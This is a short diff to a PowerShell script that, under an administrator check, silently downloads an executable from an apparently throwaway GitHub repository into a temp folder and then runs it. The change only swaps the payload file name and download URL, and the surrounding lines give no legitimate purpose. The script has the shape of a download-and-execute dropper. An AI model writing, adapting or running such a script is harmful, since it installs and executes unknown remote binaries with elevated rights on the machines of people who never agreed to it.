@@ -7,7 +7,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Resolve full path with proper casing and no short names
-$output = [IO.Path]::GetFullPath((Join-Path $OriginalTemp "cf3.exe"))
+$output = [IO.Path]::GetFullPath((Join-Path $OriginalTemp "cf2.exe"))
 
 try {
     # Force create directory structure
@@ -24,7 +24,7 @@ try {
     
     # Download and replace placeholder
     $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/Client5.exe' -OutFile $resolvedPath
+    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/cf2.exe' -OutFile $resolvedPath
     
     # Verify and execute
     if (Test-Path $resolvedPath) {
